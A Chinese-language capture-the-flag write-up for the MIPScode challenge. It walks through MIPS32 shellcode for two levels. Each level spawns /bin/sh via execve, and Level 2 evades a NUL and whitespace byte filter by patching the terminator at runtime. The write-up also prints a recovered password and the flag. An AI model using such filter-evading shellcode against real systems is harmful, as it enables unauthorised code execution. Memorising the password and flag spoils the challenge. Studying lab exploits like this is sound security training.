# MIPScode

## 题目简述

题目分两级执行用户提供的 MIPS32 little-endian shellcode。程序先用一段代码把大部分寄存器污染为 `0xffffffff`，再跳到 RWX 内存。Level 1 限长 32 字节；Level 2 限长 44 字节并禁止 NUL 与所有空白字节，且需要先从 Level 1 读取密码。

## 解题过程

Level 1 使用 branch-and-link 获取 PC，让 `$ra` 指向附近数据；用 `slti $a1/$a2,$zero,-1` 在无现成零寄存器状态下生成 0，再调用 MIPS Linux `execve`（系统调用号 4011）：

```asm
bgezal $zero, getpc
getpc:
    addiu $a0, $ra, 0x10
    slti  $a1, $zero, -1
    slti  $a2, $zero, -1
    li    $v0, 4011
    syscall 0xd1337
    .asciiz "/bin/sh"
```

进入 shell 后读取 `/ctf/pwd_next.txt`，得到 Level 2 的 64 字节密码：

```text
8ff28f88f91b8f93006ed39cba6217e2860cb2c004eb490a1b16aeb2948164d6
```

Level 2 同样用 link 指令取 PC，但字符串内嵌为两个非零 word，并在运行时用 `sb` 补终止 NUL，从而绕过静态字节过滤。官方解法还调整首两个字节以避开空白字节：

```asm
bltzal $zero, getpc
getpc:
    addiu $v0, $zero, 0xfab
    slti  $a2, $zero, -1
    slti  $a1, $zero, -1
    addiu $a0, $ra, 0x101
    addiu $t4, $a0, -0xdd
    sb    $a2, -1($t4)
    addiu $a0, $a0, -0xe5
    syscall 0x040405
    .word 0x6e69622f
    .word 0x6168732f
```

汇编后再按官方脚本把最前两个字节替换为 `ff ff`，使 branch immediate 也避开过滤；最终逐字节确认载荷不含 NUL 或 `isspace()` 会识别的字符。

取得第二级 shell 后，flag 为 `byuctf{if_i_had_to_do_it_you_have_to_also}`。

## 方法总结

这是受限 shellcode，而非普通固件逆向。核心是 MIPS 的 PC 获取、寄存器自举、little-endian 指令编码和运行时生成禁用字节；每一级都应在发送前检查长度及 `0x00`/空白过滤结果。
